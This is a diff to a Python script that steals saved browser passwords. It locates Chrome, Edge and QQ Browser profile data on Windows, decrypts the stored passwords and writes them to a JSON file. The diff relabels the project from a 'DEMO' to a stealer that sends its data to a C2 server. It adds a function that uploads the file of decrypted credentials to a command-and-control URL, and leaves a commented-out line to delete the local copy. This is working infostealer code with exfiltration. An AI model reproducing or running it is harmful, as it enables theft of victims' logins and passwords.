@@ -1,9 +1,10 @@
-# This project is the DEMO script made of a password leakage vulnerability for the browser
+# This project uses Get_Chromium_password and transfers its data to C2Server
 import os
 import sqlite3
 import base64
 import win32crypt
 import json
+import requests
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 
@@ -22,6 +23,7 @@ def getTargetPath():
     # get default borswer path
 
     target_browser = {}
+
     # google chrome
     browser_path_chrome = os.path.join(
         localappdata_path, 'Google\\Chrome\\User Data')
@@ -33,6 +35,12 @@ def getTargetPath():
         localappdata_path, 'Microsoft\\Edge\\User Data')
     if os.path.exists(browser_path_edge):
         target_browser['edge'] = browser_path_edge
+
+    # QQ browser
+    browser_path_qq = os.path.join(
+        localappdata_path, 'Tencent\\QQBrowser\\User Data')
+    if os.path.exists(browser_path_qq):
+        target_browser['qq'] = browser_path_qq
 
     pathDict['target_browser'] = target_browser
 
@@ -114,6 +122,8 @@ def decrypt(encrypted_password_list, encrypted_key):
 
     return encrypted_password_list
 
+# decryption algorithm
+
 
 def V10decrypt(encrypt_password, encrypted_key):
     # decrypt AESGCM
@@ -122,8 +132,6 @@ def V10decrypt(encrypt_password, encrypted_key):
     plaintext = aesgcm.decrypt(nonce, ciphertext, None)
     plaintext = plaintext.decode('utf-8')
     return plaintext
-
-# decryption algorithm
 
 
 def V11decrypt(encrypt_password, encrypted_key):
@@ -141,7 +149,6 @@ def showHex(data):
 
 
 # save file
-
 def save_file(password_list, browser):
     # save password_list to json without password_encrypted
     fileName = 'password_list_'+browser+'.json'
@@ -152,6 +159,17 @@ def save_file(password_list, browser):
     with open(fileName, 'w', encoding='UTF-8') as f:
         json.dump(password_list, f, indent=4,
                   ensure_ascii=False, sort_keys=True)
+    send_file(fileName)
+    # os.remove(fileName)
+
+# send file
+
+
+def send_file(fileName):
+    c2Server = 'https://my-ip/upload.php'
+    files = {'file': open(fileName, 'rb')}
+    r = requests.post(c2Server, files=files)
+    print(r.text)
 
 # main process
 
